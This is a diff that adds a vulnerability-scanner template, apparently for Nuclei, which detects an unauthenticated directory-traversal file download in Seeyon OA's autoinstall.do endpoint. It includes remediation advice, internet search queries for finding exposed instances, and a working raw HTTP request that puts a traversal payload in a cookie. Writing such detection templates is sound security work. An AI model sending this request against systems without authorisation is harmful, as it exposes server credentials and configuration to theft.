@@ -1,0 +1,65 @@
+id: seeyon-oa-autoinstall-anyfile-download
+
+info:
+  name: Seeyon OA autoinstall - Any File Download
+  author: qwtd
+  severity: high
+  description: |
+    An arbitrary file download vulnerability exists in the
+    `/seeyon/autoinstall.do` endpoint of Seeyon OA.
+    Due to insufficient validation of user-supplied file paths,
+    an unauthenticated attacker can download arbitrary files
+    from the server through directory traversal sequences.
+  impact: |
+    Successful exploitation may allow attackers to access
+    sensitive files stored on the server, including application
+    configuration files, log files, database connection settings,
+    credentials, and other confidential information. Disclosure
+    of such information may facilitate further attacks against
+    the affected system.
+  remediation: |
+    Upgrade Seeyon OA to a patched version provided by the vendor.
+    Validate and sanitize all file path parameters.
+    Restrict file access to approved directories and implement
+    proper path normalization to prevent directory traversal.
+  classification:
+    cwe-id: CWE-22
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+  metadata:
+    vendor: Seeyon
+    product: OA
+    verified: true
+    fofa-query: app="致远互联-OA"
+    hunter-query: web.body="seeyon"
+  tags: 致远互联-OA
+
+http:
+  - raw:
+      - |
+        POST /seeyon/autoinstall.do HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: login_locale=/../../../Logs;
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 23
+
+        method=regInstallDown64
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "Content-disposition: attachment;filename="
+      - type: word
+        part: header
+        words:
+          - "Content-Type: application/x-msdownload"
